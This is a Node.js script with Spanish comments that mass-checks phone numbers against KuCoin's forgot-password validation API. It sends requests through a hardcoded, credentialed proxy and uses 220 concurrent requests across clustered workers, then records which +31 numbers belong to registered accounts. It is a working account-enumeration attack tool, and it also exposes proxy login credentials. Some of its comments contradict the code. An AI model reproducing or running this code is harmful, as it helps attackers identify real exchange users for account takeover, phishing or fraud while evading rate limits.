const fs = require('fs/promises');
const fetch = require('node-fetch'); // Usar node-fetch
const cluster = require('cluster');
const os = require('os');
const cliProgress = require('cli-progress');
const { HttpsProxyAgent } = require('https-proxy-agent'); // Para manejar el proxy

// Configuración
const CONFIG = {
    inputFile: 'input.txt',
    validOutputFile: 'validNumbers.txt',
    concurrencyLimit: 220,
    apiUrl: 'https://www.kucoin.com/_api/ucenter/check-required-validations',
};
const proxyUrl = 'http://SnowdenCracking:Racilo11@169.197.82.58:4554';
const agent = new HttpsProxyAgent(proxyUrl); // Configurar el agente con la URL del proxy

// Barra de progreso
const progressBar = new cliProgress.SingleBar({
    format: 'Procesando | {bar} | {percentage}% | Válidos: {valid} | Inválidos: {invalid} | Reintentos: {retry}',
    barCompleteChar: '\u2588',
    barIncompleteChar: '\u2591',
    hideCursor: true,
}, cliProgress.Presets.shades_classic);

// Contadores globales
let validCount = 0;
let invalidCount = 0;
let retryCount = 0;

// Leer números desde el archivo y eliminar prefijos '49'
async function readNumbersFromFile() {
    try {
        const data = await fs.readFile(CONFIG.inputFile, 'utf8');
        return data
            .split('\n')
            .map(line => line.trim())
            .filter(line => line) // Eliminar líneas vacías
            .map(line => line.startsWith('31') ? line.slice(2) : line); // Eliminar prefijo '49'
    } catch (error) {
        console.error('Error al leer el archivo:', error);
        process.exit(1);
    }
}

// Validar número mediante solicitud HTTP
async function checkNumberValidity(number) {
    const url = `${CONFIG.apiUrl}?address=31-${number}&bizType=FORGOT_PASSWORD_V2&seq=1&lang=es_ES`;

    try {
        const response = await fetch(url, { agent }); // Usar el agente del proxy
        if (!response.ok) {
            retryCount++;
            return;
        }

        const data = await response.json();
        const dataText = JSON.stringify(data);
        const failureText = 'data":[["my_email","google_2fa"],["my_sms","google_2fa"],["my_email","my_sms"]]';

        if (dataText.includes(failureText)) {
            invalidCount++;
        } else {
            validCount++;
            await fs.appendFile(CONFIG.validOutputFile, `+31${number}\n`);
        }
    } catch (error) {
        retryCount++;
    } finally {
        updateProgressBar();
    }
}

// Actualizar barra de progreso
function updateProgressBar() {
    progressBar.update(validCount + invalidCount + retryCount, {
        valid: validCount,
        invalid: invalidCount,
        retry: retryCount,
    });
}

// Procesar números con concurrencia limitada
async function processNumbers(numbers) {
    const concurrencyLimit = CONFIG.concurrencyLimit;
    const tasks = [];
    const results = [];

    for (const number of numbers) {
        const task = checkNumberValidity(number);
        tasks.push(task);

        // Limitar concurrencia
        if (tasks.length >= concurrencyLimit) {
            results.push(...await Promise.all(tasks));
            tasks.length = 0;
        }
    }

    // Procesar tareas restantes
    if (tasks.length > 0) {
        results.push(...await Promise.all(tasks));
    }

    return results;
}

// Manejar trabajadores del clúster
async function handleWorker(workerId) {
    console.log(`Trabajador ${workerId} iniciado`);
    const numbers = await readNumbersFromFile();
    await processNumbers(numbers);
    console.log(`Trabajador ${workerId} completó sus tareas`);
}

// Proceso principal (Master)
if (cluster.isMaster) {
    console.log(`Proceso maestro ${process.pid} corriendo`);

    const numCPUs = os.cpus().length;
    const workers = [];

    progressBar.start(300, 0, { valid: 0, invalid: 0, retry: 0 });

    for (let i = 0; i < numCPUs; i++) {
        const worker = cluster.fork();
        workers.push(worker);

        worker.on('exit', () => {
            console.log(`Trabajador ${worker.process.pid} terminó`);
        });
    }

    cluster.on('online', (worker) => {
        handleWorker(worker.id).then(() => worker.kill());
    });

    cluster.on('exit', () => {
        if (workers.every(worker => worker.isDead())) {
            progressBar.stop();
            console.log('Todas las tareas completadas.');
            process.exit(0);
        }
    });
} else {
    // Código para el trabajador
    handleWorker(cluster.worker.id).then(() => cluster.worker.kill());
}
